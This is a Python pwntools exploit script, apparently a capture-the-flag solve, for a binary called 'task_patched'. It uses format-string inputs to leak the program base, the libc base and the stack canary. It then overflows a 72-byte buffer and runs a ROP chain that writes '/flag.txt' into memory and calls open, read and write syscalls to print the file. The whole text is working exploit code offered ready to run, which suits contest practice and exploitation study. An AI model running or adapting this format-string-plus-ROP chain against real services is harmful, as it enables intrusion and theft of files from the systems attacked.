```python
#!/usr/bin/env python3
from pwnlib.fmtstr import FmtStr, fmtstr_split, fmtstr_payload
from pwn import *

elf = context.binary = ELF('./task_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
ld = ELF("./ld-2.27.so", checksec=False)

context(terminal=['tmux', 'split-window', '-h'])
context.log_level = 'info'

gs = '''
continue
'''.format(**locals())

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process(elf.path, *a, **kw)

if __name__=='__main__':
    io = start()

    io.sendlineafter(b'message: ', b'%17$p')
    leak = int(io.recvline().rstrip().decode(), 16)
    elf.address = leak - 0xc63
    info(f"ELF ADDR: {hex(elf.address)}")

    io.sendlineafter(b'message: ', b'%3$p')
    leak = int(io.recvline().rstrip().decode(), 16)
    libc.address = leak - libc.sym._IO_2_1_stdin_
    info(f"LIBC ADDR: {hex(libc.address)}")

    io.sendlineafter(b'message: ', b'%15$p')
    leak = int(io.recvline().rstrip().decode(), 16)
    canary = leak
    info(f"CANARY VAL: {hex(canary)}")

    offset = 72
    flag_string = elf.address + 0x202500  # Just an area to write too
    pop_rdi = elf.address + 0xcd3  # pop rdi; ret;
    ret = elf.address + 0x8be  # ret; 
    syscall_gadget = libc.address + 0xd2625  # syscall; ret;

    rop = ROP(elf)
    rop.raw(pop_rdi)
    rop.raw(flag_string)
    rop.gets()
    rop.raw(elf.sym.main)

    io.sendlineafter(b':', b"A"*offset + pack(canary) + b"B"*8 + rop.chain())
    io.sendlineafter(b':', b'x')
    io.sendline(b"/flag.txt\0")

    rop = ROP(libc)
    rop(rax=0x2, rdi=flag_string, rsi=0, rdx=0)
    rop.raw(syscall_gadget)

    rop(rax=0, rdi=3, rsi=flag_string, rdx=0x50)
    rop.raw(syscall_gadget)

    rop(rax=1, rdi=1, rsi=flag_string, rdx=0x50)
    rop.raw(syscall_gadget)

    rop.raw(ret)
    rop.raw(elf.sym.main)

    io.sendlineafter(b':', b"A"*offset + pack(canary) + b"C"*8 + rop.chain())
    io.sendlineafter(b':', b'x')

    io.interactive()

```